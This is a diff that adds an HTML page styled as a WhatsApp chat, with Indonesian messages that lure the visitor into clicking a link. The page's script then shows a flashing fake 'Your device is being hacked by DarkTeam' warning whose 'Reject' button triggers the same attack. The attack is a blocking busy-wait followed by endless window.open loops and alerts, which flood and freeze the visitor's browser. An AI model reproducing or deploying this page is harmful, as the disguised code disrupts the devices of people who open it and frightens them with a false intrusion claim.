@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset='UTF-8'/>
+<meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/>
+<meta content='IE=edge' http-equiv='X-UA-Compatible'/>
+
+	<title>Whatsapp UI</title>
+	<style>
+*{
+	padding: 0;
+	margin: 0;
+	box-sizing: border-box;
+	font-family: sans-serif;
+}
+.container {
+	width: 100vw;
+	margin: auto;
+}
+.chat {
+	display: flex;
+	flex-direction: column;
+	min-height: 99vh;
+	background: #f1f0e8;
+}
+.chat-header {
+	display: flex;
+	cursor: pointer;
+}
+.profile {
+	width: 100%;
+	background: #036055;
+	display: flex;
+	align-items: center;
+	height: 60px;
+	padding: 0px 10px;
+	position: relative;
+}
+.profile .pp {
+	width: 50px;
+	display: inline-block;
+	border-radius: 50%;
+	margin-left: 32px;
+}
+.profile .arrow {
+	display: inline-block;
+	width: 30px;
+	position: absolute;
+	top: 19px;
+	cursor: pointer;
+}
+.profile h2 {
+	display: inline-block;
+	line-height: 60px;
+	vertical-align: bottom;
+	color: #fff;
+	font-size: 18px;
+}
+.profile span {
+	color: #ccc;
+	position: absolute;
+	top: 42px;
+	left: 100px;
+	font-size: 14px;
+}
+.right .icon {
+	display: inline-block;
+	width: 25px;
+	margin-left: 10px;
+}
+.profile .left {
+	flex: 1;
+}
+
+.chat-box {
+	background: url('../img/bg.jpeg');
+	background-attachment: fixed;
+	padding-left: 20px;
+	overflow-y: scroll;
+	flex: 1;
+}
+.chat-box .img_chat {
+	width: 280px;
+}
+
+.chat-r {
+	display: flex;
+}
+.chat-r .sp {
+	flex: 1;
+}
+
+.chat-l {
+	display: flex;
+}
+.chat-l .sp {
+	flex: 1;
+}
+
+.chat-box .mess {
+	max-width: 300px;
+  min-width:100px;
+	background: #F7FCF6;
+	padding: 5px;
+	border-radius: 10px;
+	margin: 5px 0px;
+	cursor: pointer;
+}
+.chat-box .mess p {
+	word-break: break-all;
+	font-size: 16px;
+}
+.chat-box .mess-r {
+    background: #E2FFC7;
+}
+.chat-box .emoji {
+	width: 20px;
+}
+.chat-box .check {
+	float: right;
+}
+.chat-box .check img {
+	width: 20px;
+}
+.chat-box .check span {
+	color: #888;
+	font-size: 12px;
+	font-weight: 700px;
+}
+.pukul{
+color: #888;
+	font-size: 12px;
+	font-weight: 700px;
+}
+*::-webkit-scrollbar {
+	width: 5px;
+}
+*::-webkit-scrollbar-track {
+	background: #f1f1f1;
+}
+*::-webkit-scrollbar-thumb {
+	background: #aaa;
+}
+*::-webkit-scrollbar-thumb:hover {
+	background: #555;
+}
+
+.chat-footer {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+	border-radius: 60px;
+ margin-left:-15px;
+	position: relative;
+	cursor: pointer;
+}
+.chat-footer input {
+	display: block;
+	flex: 1;
+	width: 100%;
+	height: 50px;
+	border-radius: 60px;
+	margin: 6px;
+	padding: 10px;
+	outline: none;
+	font-size: 17px;
+	padding-left: 35px;
+	padding-right: 90px;
+	border: 2px solid #ccc;
+	color: #555;
+	resize: none;
+}
+.chat-footer .mic {
+	display: block;
+	width: 50px;
+	height: 50px;
+	margin-right: 20px;
+}
+
+.chat-footer .emo{
+	display: block;
+	width: 35px;
+	height: 35px;
+	position: absolute;
+	left: 10px;
+	top: 12px;
+}
+.chat-footer .icons {
+	position: absolute;
+	right: 100px;
+	top: 10px;
+}
+.chat-footer .icons img{
+    display: inline-block;
+    width: 30px;
+    height: 30px;
+    margin-left: 7px;
+    margin-top: 6px;
+}
+   .hacked{
+    background: black;
+    width: 99vw;
+    height: 98vh;
+    position: fixed;
+    margin: 0 auto;
+    border: 2px solid red;
+   }
+   .hacked .img{
+    width:200px;
+    position: relative;
+    margin: 0 auto;
+    top:100px;
+   }
+   .hacked .img img{
+    width:200px;
+   }
+   .hacked .img h4{
+    text-align: center;
+    color:red;
+    font-weight: 550;
+    font-size: 25px;
+   }
+   .hacked .img p{
+    text-align: center;
+    color:green;
+    font-weight: 400;
+   }
+   .hacked .img button{
+    background: red;
+    border: none;
+    margin-top: 20px;
+    margin-left: 70px;
+    border-radius: 5px;
+    padding: 5px 9px;
+    font-size: 17px;
+   }
+   @keyframes dark{
+    0%{
+     opacity: 0;
+    }
+    25%{
+     opacity: 1;
+    }
+    50%{
+     opacity: 0;
+     
+    }
+    75%{
+     
+     opacity: 1;
+    }
+    100%{
+     opacity: 0;
+     
+    }
+
+   }
+   .hacked{
+    animation-name: dark;
+    animation-duration: 0.1s;
+    animation-iteration-count: infinite;
+   }
+</style>
+</head>
+<body>
+	<div class="container">
+		<div class="chat">
+			<div style="position:fixed;top:0;width:100vw" class="chat-header">
+				<div class="profile">
+					<div class="left">
+						<img src="img/arrow.png" class="arrow">
+						<img src="img/haya.jpeg" class="pp">
+						<h2>No Name</h2>
+						<span id="tanda">online</span>
+					</div>
+					<div class="right">
+						<img src="img/video.png" class="icon">
+						<img src="img/phone.png" class="icon">
+						<img src="img/more.png" class="icon">
+					</div>
+				</div>
+			</div>
+<br><br><br>
+			<div class="chat-box">
+				<div class="chat-r">
+					<div class="sp"></div>
+					<div class="mess mess-r">
+						<p>
+        Password : Darkteam™@827276_@#
+						</p>
+						<div class="check">
+							<span class="pukul" id="pukul">jai</span>
+							<img src="img/check-2.png">
+						</div>
+					</div>
+				</div>
+				<div class="chat-l" id="pesan1" style="display:none">
+					<div class="mess">
+						<p>
+                           Wah ada pengujung...!
+						</p>
+						<div class="check">
+							<span  id="pukul1">4:00 PM</span>
+						</div>
+					</div>
+					<div class="sp"></div>
+				</div>
+<div id="chatingan"></div>
+				<div class="chat-l" id="pesan2" style="display:none">
+					<div class="mess">
+						<p>
+                            Bentar yaa, jangan skip dulu ..,<br><a style="color:green" onclick="next()">Klik disini</a>
+						</p>
+						<div class="check">
+							<span id="pukul2">4:00 PM</span>
+						</div>
+					</div>
+					<div class="sp"></div>
+				</div>
+<!--
+				<div class="chat-l" id="pesan3" style="display:none">
+					<div class="mess">
+						<p>
+                            Gak bisa balas pesan yaa!
+						</p>
+						<div class="check">
+							<span id="pukul3">4:00 PM</span>
+						</div>
+					</div>
+					<div class="sp"></div>
+				</div>
+
+				<div class="chat-l" id="pesan4" style="display:none">
+					<div class="mess">
+						<p>
+                            Klik Love ini ya<br><a onclick='play()'>♥♥♥</a>
+						</p>
+						<div class="check">
+							<span id="pukul4">4:00 PM</span>
+						</div>
+					</div>
+					<div class="sp"></div>
+				</div>
+<div id="chatingan"></div>-->
+<br><br><br>
+			<div class="chat-footer" style="position: fixed;bottom:0; display:none">
+				<input placeholder="Type a message">
+				<div class="icons" onclick="mulai()">
+				</div>
+			</div>
+		</div>
+	</div>
+
+  <div class="hacked" style="display:none" id="hacked">
+   <div class="img">
+   <img src="https://geektyper.com/mobile/warning.png" alt="DarkTeam" />
+   <h4>WARNING</h4>
+   <p>Your device is being hacked by DarkTeam, click the red button below to exit and stop hacking</p>
+   <button type="button" onclick="next()">Reject</button>
+   </div>
+  </div>
+	  <script>
+var x = new Audio('https://irul441.github.io/sound.mp3');function play() { x.play();}
+var jam=new Date().getHours()+'.'+new Date().getMinutes();
+document.getElementById("pukul").innerHTML =jam;
+function mulai(){
+document.getElementById("pukul").innerHTML =new Date().getHours()+'.'+new Date().getMinutes();
+}
+function pergantian2(){
+document.getElementById("tanda").innerHTML ='mengetik...';
+}
+
+function pergantian(){document.getElementById("tanda").innerHTML ='online';}
+function pergantian3(){
+pergantian();setTimeout(pergantian2,500)
+}
+function pergantian4(){
+pergantian();setTimeout(pergantian2,500);setTimeout(pergantian,1000);
+}
+function hai(){document.getElementById("pesan1").style.display="flex";pergantian3();
+function pesan2(){document.getElementById("pesan2").style.display="flex";pergantian4()}
+function pesan3(){document.getElementById("pesan3").style.display="flex";pergantian3()}
+document.getElementById("pukul1").innerHTML =new Date().getHours()+'.'+new Date().getMinutes();
+setTimeout(pesan2,4000);
+setTimeout(pesan3,6000);
+setTimeout(function (){document.getElementById("pesan4").style.display="flex";document.getElementById("tanda").innerHTML ='online';},8000);
+}
+setTimeout(hai,2000);
+document.getElementById("pukul2").innerHTML =new Date().getHours()+'.'+new Date().getMinutes();
+pergantian2()
+</script>
+
+  <script type="text/javascript" charset="utf-8">
+   function next() {
+document.getElementById("hacked").style.display='block';
+  window.open ("contoh2.html")
+
+function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}
+alert ("Overload!");
+sleep (6000);
+while(true) window.open("contoh2.html");
+
+alert ("Overload!");
+while(true) window.open("contoh2.html");
+while(true) window.open("contoh2.html");
+while(true) window.open("contoh2.html");
+while(true) window.open("contoh2.html");
+while(true) window.open("contoh2.html");
+alert ("Overload!");
+while(true) window.open("contoh2.html");
+alert ("Overload!");
+while(true) window.open("contoh2.html");
+alert ("Overload!");
+while(true) window.open("contoh2.html");
+alert ("Overload!");
+while(true) window.open("contoh2.html");
+}
+  </script>
+  
+
+</body>
+</html>
